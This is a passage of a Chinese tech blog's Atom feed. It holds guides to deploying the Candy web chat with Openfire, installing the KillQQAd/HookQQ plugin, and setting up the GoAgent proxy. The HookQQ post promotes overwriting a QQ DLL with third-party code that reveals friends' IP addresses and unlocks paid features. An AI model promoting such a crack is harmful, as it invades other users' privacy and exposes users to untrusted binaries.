2014-10-24</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Hosts屏蔽QQ广告&quot;&gt;&lt;a href=&quot;#Hosts屏蔽QQ广告&quot; class=&quot;headerlink&quot; title=&quot;Hosts屏蔽QQ广告&quot;&gt;&lt;/a&gt;Hosts屏蔽QQ广告&lt;/h2&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
    
      <category term="QQ" scheme="https://g2ex.top/tags/QQ/"/>
    
      <category term="Hosts" scheme="https://g2ex.top/tags/Hosts/"/>
    
      <category term="Skype" scheme="https://g2ex.top/tags/Skype/"/>
    
      <category term="Android" scheme="https://g2ex.top/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>部署Candy - 搭建自己的Web聊天服务器</title>
    <link href="https://g2ex.top/2013/07/21/Deploy-Candy-Chat-Jabber-Server/"/>
    <id>https://g2ex.top/2013/07/21/Deploy-Candy-Chat-Jabber-Server/</id>
    <published>2013-07-21T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_candy.webp" alt="candy"></p><p>Candy是基于JavaScript的多用户通信Web客户端，可用于搭建互联网和局域网的聊天系统，它最大的特点是多用户、实时、简单，以下是官网对Candy的介绍，你还可以去<a href="http://candy-chat.github.io/candy/" target="_blank" rel="noopener">Candy</a>的主页体验一下它的Demo。</p><blockquote><ol><li>Focused on real-time multi-user chatting</li><li>Easy to configure, easy to run, easy to use</li><li>Highly customizable</li><li>100% well-documented JavaScript source code</li><li>Built for Jabber (XMPP), using famous technologies</li><li>Used and approved in a productive environment with up to 400 concurrent users</li><li>Works with all major web browsers including IE7</li></ol></blockquote><p>Candy的部署需要用到两个服务：HTTP服务和Jabber（XMPP）服务。提供HTTP服务常用的软件有apache httpd、nginx、lighttpd、IIS、Node.js等。XMPP（Extensible Messaging and Presence Protocol，前称Jabber）是一种以XML为基础的开放式实时通信协议，能提供Jabber服务的软件有Openfire、ejabberd等。</p><p>说到部署自己的聊天服务，最简单的方法是在服务器上安装Openfire或ejabberd，就可以在其他电脑上使用Spark或者Pidgin进行聊天。Candy的好处是不需要Spark或Pidgin等客户端，在服务器端部署好HTTP服务，那么在其他计算机上只需要打开网页就可以聊天了，这也就是为什么Candy的部署需要Apache或者其他HTTP服务的支持了。</p><p>本文介绍如何在Windows上部署Candy，在开始之前，需要下载：XAMPP、Openfire和Candy。其中XAMPP包含了Apache和MySQL等。</p><p>目前，XAMPP最新版本是1.8.2；Openfire版本是3.8.2；Candy版本是1.0.9。</p><h2 id="一、安装xampp"><a href="#一、安装xampp" class="headerlink" title="一、安装xampp"></a>一、安装xampp</h2><ol><li><p>在选择要安装组件步骤时，Apache和PHP是默认选中的，如果想在Candy中使用MySQL数据库而不是Candy的内嵌数据库，需要勾选上<code>MySQ</code>L和<code>phpMyAdmin</code>。</p></li><li><p>在XAMPP控制面板，点击Apache的Config =&gt; httpd.conf，依次去掉下面三行前面的<code>#</code>来启用<code>Apache的mod_rewrite</code>、<code>mod_proxy</code>和<code>mod_proxy_http</code>模块。</p> <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></li></ol><p>实际上，XAMPP已经启用了<code>mod_rewrite</code>和<code>mod_proxy</code>，我们只需要去掉<code>mod_proxy_http</code>之前的<code>#</code>就可以了。</p><h2 id="二、配置MySQL"><a href="#二、配置MySQL" class="headerlink" title="二、配置MySQL"></a>二、配置MySQL</h2><ol><li><p>如果没有安装MySQL或者不想使用MySQL，请跳过这一步。</p></li><li><p>在XAMPP控制面板启动Apache和MySQL的服务，点击Apache的<code>Admin</code>，选择语言后点击左侧的<code>安全</code>，如下图所示，可以看到目前服务器的安全状态。</p><p> <img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_114012.webp" alt="XAMPP安全"></p><p> 点击图中红框标记的链接，为MySQL的root账号添加密码（同时也可以为XAMPP添加具有访问权限的账号和密码）。</p></li><li><p>在XAMPP控制面板点击MySQL的<code>Admin</code>，使用root账号和刚刚设置的root密码登陆，创建名为<code>candy</code>的数据库，当然，数据库的名字是自定义的，也可以用自己喜欢易记的名字。这个名字在Openfire初始化的时候会用到。</p></li></ol><h2 id="三、安装并初始化Openfire"><a href="#三、安装并初始化Openfire" class="headerlink" title="三、安装并初始化Openfire"></a>三、安装并初始化Openfire</h2><ol><li><p>点击<code>Launch Admin</code>，选择语言（这里选择了中文），下一步是服务器设置，如下图所示，域默认的是计算机的主机名，可以保持默认，也可以修改成其他，这里改为<code>localhost</code>，可以把鼠标移到相应的<code>问号</code>图标上查看设置的说明。</p><p> <img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_131826.webp" alt="Openfire服务器设置"></p></li><li><p>点击<code>继续</code>进入数据库设置，如下图所示，这里选择<code>标准数据库连接</code>。如果没有安装MySQL或其他数据库，那就只能选择<code>嵌入的数据库</code>了，设置更方便。</p><p> <img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_132733.webp" alt="Openfire数据库设置"></p></li><li><p>点击<code>继续</code>，在<code>数据驱动选项</code>中选择<code>MySQL</code>，把<code>数据库URL</code>中的<code>[host-name]</code>改为<code>localhost</code>，把<code>[database-name]</code>改为<code>candy</code>。如下图所示：</p><p> <img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_134016.webp" alt="Openfire的MySQL数据库设置"></p></li><li><p>点击<code>继续</code>，不用更改<code>特性设置</code>，点击<code>继续</code>，为管理员账户设置电子邮件和密码，点击<code>继续</code>安装完成。在Openfire管理框中先<code>Stop</code>，再<code>Start</code>重启Openfire。点击<code>Launch Admin</code>接下来就要使用<code>admin</code>账号和刚刚设置的密码登陆到管理控制台了。</p></li></ol><h2 id="四、设置Openfire"><a href="#四、设置Openfire" class="headerlink" title="四、设置Openfire"></a>四、设置Openfire</h2><p>使用<code>admin</code>登陆Openfire管理控制台之后，需要做如下设置：</p><ol><li><p>服务器 =&gt; 服务器设置 =&gt; HTTP绑定，按下图设置，如果你更改了端口号，那么在后续的Candy设置中也要做相应的更改。</p><p> <img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_135325.webp" alt="Openfire的HTTP绑定设置"></p></li><li><p>分组聊天 =&gt; 房间管理员 =&gt; 创建新房间，记住创建的房间标识，这里取名为<code>Default</code>，如下图所示：</p><p> <img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_135855.webp" alt="Openfire创建新房间"></p></li><li><p>插件 =&gt; 有效的插件，安装Client Control插件。</p></li><li><p>服务器 =&gt; 客户端管理Client Management =&gt; 分组聊天书签 =&gt; 增加分组对话书签，分组对话地址是<code>Default@conference.localhost</code>，其中<code>Default</code>是上面新建房间的名字，<code>localhost</code>是在<code>步骤0x02</code>中设置的域名字。</p><p> 勾选<code>所有用户</code>和<code>自动加入</code>，这样登陆聊天服务器的所有人都会自动加入到<code>Default</code>这个房间。</p></li></ol><h2 id="五、配置Candy"><a href="#五、配置Candy" class="headerlink" title="五、配置Candy"></a>五、配置Candy</h2><ol><li><p>解压candy，为方便起见，把解压得到的文件夹重命名为<code>candy</code>，并放到Apache web目录xampp/htdocs下，把htdocs/candy/example/目录下的htaccess和index.html复制到htdocs/candy/目录下。</p></li><li><p>修改htacess，把最后一行中的<code>5280</code>改为<code>7070</code>。这是因为在上面我们设置Openfire的HTTP绑定端口为<code>7070</code>，如果你自己改成了其他端口号，这里就把<code>5280</code>改为你定义的端口号。</p></li><li><p>把htaccess重命名为.htaccess。注意：在Windows中直接改名字不允许以<code>.</code>开头，可以在命令行下使用rename命令完成重命名，如下图所示：</p><p> <img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_142715.webp" alt="重命名htaccess为.htaccess"></p></li><li><p>修改index.html，把5处<code>..</code>都改为<code>.</code>（可以使用替换工具），然后把</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">Candy.init(<span class="string">'http-bind/'</span>, &#123;</span><br><span class="line">    core: &#123; <span class="attr">debug</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">    view: &#123; <span class="attr">resources</span>: <span class="string">'./res/'</span> &#125;</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">Candy.Core.connect();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><p>修改为：<br>    <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">Candy.init(<span class="string">'http-bind/'</span>, &#123;</span><br><span class="line">core: &#123; <span class="attr">debug</span>: <span class="literal">false</span>, <span class="attr">autojoin</span>: [<span class="string">'Default@conference.localhost'</span>] &#125;,</span><br><span class="line">view: &#123; <span class="attr">resources</span>: <span class="string">'./res/'</span>, <span class="attr">language</span>: <span class="string">'cn'</span> &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Candy.Core.connect(<span class="string">'localhost'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><pre><code>上面代码中`Candy.Core.connect()`是Candy的登陆方法，有多种参数，可以参考Candy的`Login Methods`的介绍，修改后的代码实现了Candy Demo一样的效果，即不需要使用密码就可以登陆聊天。</code></pre><h2 id="六、修改Apache配置"><a href="#六、修改Apache配置" class="headerlink" title="六、修改Apache配置"></a>六、修改Apache配置</h2><p>最后，修改Apache的<code>httpd.conf</code>配置文件，查找<code>htdocs</code>，在其后添加<code>/candy</code>，修改后的两行最终效果为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentRoot "D:/xampp/htdocs/candy"</span><br><span class="line"><span class="tag">&lt;<span class="name">directory</span> "<span class="attr">D:</span>/<span class="attr">xampp</span>/<span class="attr">htdocs</span>/<span class="attr">candy</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>OK！一切部署完毕！重启Apache，重启Openfire，在局域网中任何一台电脑的浏览器中输入服务器计算机的IP地址，就可以看到登陆界面了。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_144608.webp" alt="Candy登陆界面"></p><p>另外需要说明的是，如果想让Candy支持SSL加密连接，需要修改Apache的「httpd-ssl.conf」配置文件：</p><p>把<code>DocumentRoot &quot;D:/xampp/htdocs&quot;</code>修改为<code>DocumentRoot &quot;D:/xampp/htdocs/candy&quot;</code>，把<code>ServerName www.example.com:443</code>修改为<code>ServerName localhost:443</code>或<code>ServerName 『你的服务器IP地址』:443</code>。</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ol><li><a href="http://candy-chat.github.io/candy/" target="_blank" rel="noopener">http://candy-chat.github.io/candy/</a></li><li><a href="https://github.com/candy-chat/candy/wiki/Installing-a-Jabber-server" target="_blank" rel="noopener">https://github.com/candy-chat/candy/wiki/Installing-a-Jabber-server</a></li><li><a href="https://zh.wikipedia.org/zh-cn/XMPP" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-cn/XMPP</a></li><li><a href="http://www.yuexuan.org/?p=1570" target="_blank" rel="noopener">http://www.yuexuan.org/?p=1570</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/gymgle/imgur/2013-07-21_candy.webp&quot; alt=&quot;candy&quot;&gt;&lt;/p&gt;
&lt;p&gt;Candy是基于JavaScript的多用户通信Web客户端，可用于搭建互联网和局域网
      
    
    </summary>
    
    
      <category term="Candy" scheme="https://g2ex.top/tags/Candy/"/>
    
      <category term="Jabber" scheme="https://g2ex.top/tags/Jabber/"/>
    
      <category term="Openfire" scheme="https://g2ex.top/tags/Openfire/"/>
    
      <category term="Apache" scheme="https://g2ex.top/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>HookQQ - QQ显IP插件</title>
    <link href="https://g2ex.top/2012/05/22/HookQQ/"/>
    <id>https://g2ex.top/2012/05/22/HookQQ/</id>
    <published>2012-05-22T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>不管是有意还是无意中看到朋友用着臃肿的QQ，在迷你首页、弹出新闻的骚扰下，在聊天界面上烦心广告、鸡肋的Q秀下聊得不亦乐乎时，我总是按捺不住的说一句，“给你个去广告的插件”！不少次，得到的回复是“什么广告？”</p><p>简单，不仅是一个人的追求。简单，是一种美。</p><p>再华丽的QQ皮肤，再炫酷的QQ秀，在不在意不关注的人看来，这些都是虚幻。QQ带给你的，无非就是聊天，和亲人、朋友、同学之间的沟通。今天，给大家介绍的是一个插件——去除QQ界面中的广告，去掉QQ中的弹窗，禁用那些你不需要的功能（可选），而且还可以显示好友IP！（你也可以选择不显示）更让你惊喜的是能让你本地会员！这个插件就是KillQQAd！（可以这样认为：KillQQAd是一个插件，HookQQ是一个平台）还记得曾经的珊瑚虫QQ吗？甚至现在的快乐无极QQ，它们去广告显IP的功能都是封装了这个插件来实现的！看！强大吧！</p><p>官网论坛对它的描述：</p><blockquote><ol><li>去广告：去除腾讯QQ界面上的广告信息 </li><li>显示IP：显示QQ好友的IP及归属地信息 </li><li>老板键：按下预设的快捷键，QQ立即隐藏 </li><li>QQ加速：任意禁用QQ组件，加快QQ运行 </li><li>本地会员：免费开启QQ会员才有的“登录提示”、“图片涂鸦”功能 </li><li>扩展聊天窗口：自动隐藏聊天窗口的QQ秀，让聊天窗口更大 </li><li>强开透明皮肤：可以强制开启QQ透明皮肤效果，让QQ更绚丽 </li><li>自动更新版本号：当好友使用了较新的QQ版本，您也能立即知道</li></ol></blockquote><p>插件的安装也非常简单，首先你需要安装腾讯官网的QQ，然后：</p><h2 id="一、下载KillQQAd"><a href="#一、下载KillQQAd" class="headerlink" title="一、下载KillQQAd"></a>一、下载KillQQAd</h2><ul><li>进入<a href="http://bbs.hookqq.com/" title="HookQQ" target="_blank" rel="noopener">http://bbs.hookqq.com/</a>的软件更新板块，打开置顶的帖子，看到“KillQQAd 1.0.1.36下载地址”（目前最新版是1.0.1.36），点击下载吧！</li></ul><h2 id="二、配置插件"><a href="#二、配置插件" class="headerlink" title="二、配置插件"></a>二、配置插件</h2><ul><li><p>关闭QQ。把下载的压缩包解压缩到当前文件夹，复制“KillQQAd 1.0.1.36”目录下的文件放到QQ安装目录Bin下，提示已经存在了xGraphic32.dll，选择覆盖之！</p></li><li><p>然后启动QQ吧！是不是清爽多了！聊天窗口显示好友IP处，右键单击，可设置相关选项。如果不想显示IP，去掉第一个选项。给好友发送自定义图片，就可以看到他的IP地址了。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2012-05-22_004441.webp" alt="KillQQAd设置" title="KillQQAd设置"></p></li><li><p>KillQQAd官方论坛：<a href="http://bbs.hookqq.com/" title="HookQQ" target="_blank" rel="noopener">http://bbs.hookqq.com/</a></p></li></ul><h2 id="三、其他"><a href="#三、其他" class="headerlink" title="三、其他"></a>三、其他</h2><p>其实，还有另外一款去广告的QQ插件，其名为“幽香”，幽香2支持QQ2011，幽香3开始支持QQ2012 beta，但是它的作者耍下在今年3月24日博客上说“不赚一分钱，辛辛苦苦写软件。还要挨骂，挨骂了还没人来帮我。做着有什么意思呢？哥自个儿玩去，不赔你们了，再见。”没事大家可以去他网站逛逛：<a href="http://www.shuax.com/" title="耍下" target="_blank" rel="noopener">http://www.shuax.com/</a></p><p><code>update 20130517: HookQQ、幽香都已经停止更新</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不管是有意还是无意中看到朋友用着臃肿的QQ，在迷你首页、弹出新闻的骚扰下，在聊天界面上烦心广告、鸡肋的Q秀下聊得不亦乐乎时，我总是按捺不住的说一句，“给你个去广告的插件”！不少次，得到的回复是“什么广告？”&lt;/p&gt;
&lt;p&gt;简单，不仅是一个人的追求。简单，是一种美。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="QQ" scheme="https://g2ex.top/tags/QQ/"/>
    
      <category term="Crack" scheme="https://g2ex.top/tags/Crack/"/>
    
  </entry>
  
  <entry>
    <title>GoAgent</title>
    <link href="https://g2ex.top/2012/05/19/GoAgent/"/>
    <id>https://g2ex.top/2012/05/19/GoAgent/</id>
    <published>2012-05-19T00:00:00.000Z</published>
    <updated>2014-08-22T00:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一个伟大的防火长城，“它影响了无数科研教育工作者的研究和交流，阻碍了无数企业的科研和贸易，中断了无数留学归来的人和同学朋友的联系。”——王维嘉</p></blockquote><p>当你用Google查找资料的时候，是否连接经常被重置？Gmail的聊天、语音或视频中，你是否频繁断开连接？朋友问起你的Facebook时，你是否只能说“大陆的互联网没脸……谱”？如果你还未曾用过翻墙软件，那么今天将是你跨出局域网的一大步！</p><p>简单来说，goagent是一款代理软件。详细一点，它是运行在Google App Engine（简称GAE）平台下，供你畅游互联网的一款开源软件<del>（不足4M）</del><code>update 20140822</code>。因为使用Google的服务，它的速度之快，性能之强，连接稳定，在翻墙代理一类软件中，所向披靡。关于它的详情，请访问它在Google托管的Project：<a href="https://goagent.googlecode.com/" target="_blank" rel="noopener">https://goagent.googlecode.com/</a></p><p>下面是本文的重点，即将开始goagent的设置，不要被繁琐的文字所迷惑，其实很简单。</p><hr><h2 id="一、GAE搭建"><a href="#一、GAE搭建" class="headerlink" title="一、GAE搭建"></a>一、GAE搭建</h2><ol><li><p>你要有一个Google的帐户。直白地说，只要你有Gmail（如果真的没有Gmail，求求你注册一个）。使用你的Google帐户登录<a href="https://appengine.google.com/" target="_blank" rel="noopener">https://appengine.google.com/</a>。 登陆后点击“Create Application”，输入你的手机号码来接收验证码。注意：手机号码前需要使用“+86”。如果几分钟之内手机收不到验证码，除了换其他手机号之外，还可以来这里<a href="https://appengine.google.com/waitlist/sms_issues" target="_blank" rel="noopener">https://appengine.google.com/waitlist/sms_issues</a>填写相关信息，过后Google帮你开通GAE。</p></li><li><p>填入验证码，点击“send”，开始填写你的Application信息。你需要牢记你填写的“Application Identifier”（你的appid），至于“Application Title”，随便写。然后接受条款，“Create Applicaiton”。至此，你的GAE创建完成。</p></li><li><p>如果你想图文并茂的一步步来，请搜索“goagent设置”。</p></li></ol><h2 id="二、下载goagent"><a href="#二、下载goagent" class="headerlink" title="二、下载goagent"></a>二、下载goagent</h2><ol><li><p>下载地址：<a href="https://code.google.com/p/goagent/" target="_blank" rel="noopener">https://code.google.com/p/goagent/</a></p></li><li><p>注意：在页面的下载链接上点右键另存为，不要使用迅雷等下载工具下载。</p></li></ol><h2 id="三、配置goagent"><a href="#三、配置goagent" class="headerlink" title="三、配置goagent"></a>三、配置goagent</h2><ol><li><p>解压缩文件。修改local\proxy.ini中的<code>gae</code>下的appid=你的appid。</p></li><li><p>双击server\uploader.bat，按照提示输入你的appid、Gmail帐户和密码，等待完成。</p></li><li><p>配置浏览器。<br>推荐使用Chrome。如果你使用IE，当然也可以。Chrome用户请安装SwitchySharp插件，然后导入这个设置<a href="https://goagent.googlecode.com/files/SwitchyOptions.bak" target="_blank" rel="noopener">https://goagent.googlecode.com/files/SwitchyOptions.bak</a>。<del>IE用户依次点击“Internet选项”-&gt;“连接”选项卡-&gt;“局域网设置”按钮，勾选“为LAN使用代理服务器”，地址中填127.0.0.1，端口中填8087。</del> IE用户需要右击Goagent的托盘图标，选择<code>设置IE代理</code> | <code>127.0.0.1:8087</code>。<code>update 20140822</code></p></li><li><p>至此，所有的配置工作完成了。打开local\goagent.exe畅游真正的互联网吧！</p></li></ol><h2 id="四、说明"><a href="#四、说明" class="headerlink" title="四、说明"></a>四、说明</h2><p>为什么推荐Chrome呢？暂且不说它解析网页的强劲效果和神一级的速度以及种类繁多的扩展程序，它的SwitchySharp可以实现Chrome的自动代理，也就是说对于墙外的网站，Chrome通过goagent代理访问，未被墙的网站则正常访问。</p><p>对于IE用户，一旦设置了代理，所有访问的网站都会通过goagent访问。如果你们不想使用代理了，还需要<del>在Internet选项中勾掉“为LAN使用代理服务器”</del>右击Goagent的托盘程序，选择<code>设置IE代理</code> | <code>禁用代理</code>。<code>update 20140822</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;一个伟大的防火长城，“它影响了无数科研教育工作者的研究和交流，阻碍了无数企业的科研和贸易，中断了无数留学归来的人和同学朋友的联系。”——王维嘉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当你用Google查找资料的时候，是否连接经常被重置？Gmai
      
    
    </summary>
    
    
      <category term="Goagent" scheme="https://g2ex.top/tags/Goagent/"/>
    
  </entry>
  
</feed>
